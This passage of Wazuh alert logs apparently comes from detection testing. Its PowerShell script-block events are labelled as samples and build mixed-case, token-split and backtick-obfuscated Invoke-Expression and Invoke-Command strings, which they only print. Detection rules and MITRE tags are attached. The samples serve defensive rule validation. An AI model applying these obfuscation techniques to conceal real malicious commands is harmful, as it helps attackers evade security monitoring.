(\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: 26130559-8506-43c4-8eac-6e4dc574d99e\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-062'; $scenario = 'iex_clear_mixed_case_v1'; $indicator = 'InVoKe-ExPrEsSiOn ''WrItE-oUtPuT sImUlAtEd'''; Write-Output $indicator; Write-Output 'mixed-case text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"26130559-8506-43c4-8eac-6e4dc574d99e"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:19.786+0200","rule":{"level":14,"description":"Powershell script used \"Invoke-command\" cmdlet to execute code on remote computer","id":"91823","mitre":{"id":["T1059.001","T1021.006"],"tactic":["Execution","Lateral Movement"],"technique":["PowerShell","Windows Remote Management"]},"firedtimes":2,"mail":true,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253539.1388870","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:18.8970670Z","eventRecordID":"117811","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-069'; $scenario = 'remote_command_clear_mixed_case_v1'; $indicator = 'InVoKe-CoMmAnD -cOmPuTeRnAmE wS-aPp-01 -ScRiPtBlOcK { gEt-PrOcEsS }'; Write-Output $indicator; Write-Output 'mixed-case text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: f847afc5-926e-4c32-a6c9-f238ff64c8a9\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-069'; $scenario = 'remote_command_clear_mixed_case_v1'; $indicator = 'InVoKe-CoMmAnD -cOmPuTeRnAmE wS-aPp-01 -ScRiPtBlOcK { gEt-PrOcEsS }'; Write-Output $indicator; Write-Output 'mixed-case text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"f847afc5-926e-4c32-a6c9-f238ff64c8a9"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:21.007+0200","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":4,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253541.1391768","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:20.5221108Z","eventRecordID":"117894","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-082'; $scenario = 'iex_clear_alias_reconstruction_v1'; $tokens = @('Invoke-E', 'xpressio', 'n ''Write', '-Output ', 'simulate', 'd'''); $indicator = -join $tokens; Write-Output $indicator; Write-Output 'alias/reconstruction text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: 11212790-24c7-4e31-90da-2138f97f661d\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-082'; $scenario = 'iex_clear_alias_reconstruction_v1'; $tokens = @('Invoke-E', 'xpressio', 'n ''Write', '-Output ', 'simulate', 'd'''); $indicator = -join $tokens; Write-Output $indicator; Write-Output 'alias/reconstruction text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"11212790-24c7-4e31-90da-2138f97f661d"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:21.981+0200","rule":{"level":4,"description":"Powershell executing process discovery","id":"91815","mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]},"firedtimes":13,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253541.1394810","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:21.3875716Z","eventRecordID":"117922","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-089'; $scenario = 'remote_command_clear_alias_reconstruction_v1'; $tokens = @('Invoke-Comman', 'd -ComputerNa', 'me WS-APP-01 ', '-ScriptBlock ', '{ Get-Process', ' }'); $indicator = -join $tokens; Write-Output $indicator; Write-Output 'alias/reconstruction text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: f0651ed1-bdda-46f3-96d1-85646ef5b139\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-089'; $scenario = 'remote_command_clear_alias_reconstruction_v1'; $tokens = @('Invoke-Comman', 'd -ComputerNa', 'me WS-APP-01 ', '-ScriptBlock ', '{ Get-Process', ' }'); $indicator = -join $tokens; Write-Output $indicator; Write-Output 'alias/reconstruction text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"f0651ed1-bdda-46f3-96d1-85646ef5b139"}}},"location":"EventChannel"}
{"timestamp":"2026-07-05T14:12:23.271+0200","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":5,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"001","name":"Windows-Host","ip":"172.28.192.1"},"manager":{"name":"MSI"},"id":"1783253543.1414706","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-05T12:12:22.8977709Z","eventRecordID":"117972","processID":"28248","threadID":"19716","channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId = 'OBF-102'; $scenario = 'iex_clear_combined_obfuscation_v1'; $p = @('InVoKe-E', 'xPrEsS`i', 'On ''WrIt', 'E-oUtPuT', ' sImUlAt', 'Ed'''); $indicator = ($p -join ''); Write-Output $indicator; Write-Output 'combined-obfuscated text is inert and not executed'; Write-Output (\"WAZUH_SAMPLE {0} {1}\" -f $sampleId, $scenario)\r\n\r\nScriptBlock ID: 67a26c96-0391-4e1a-af9b-ce587adf84ba\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sampleId = 'OBF-102'; $scenario = 'iex_clear_combined_obfuscation_v1'; $p = @('InVoKe-E', 'xPrEsS`i', 'On ''WrIt', 'E-oUtPuT', ' sImUlAt', 'Ed'''); $indicator = ($p -join ''); Write-Output $indicator; Write-Output 'combined-obfuscated text is inert and not executed'; Write-Output (\\\"WAZUH_SAMPLE {0} {1}\\\" -f $sampleId, $scenario)","scriptBlockId":"67a26c96-0391-4e1a-af9b-ce587adf84ba"}}},"location":"EventChannel"}
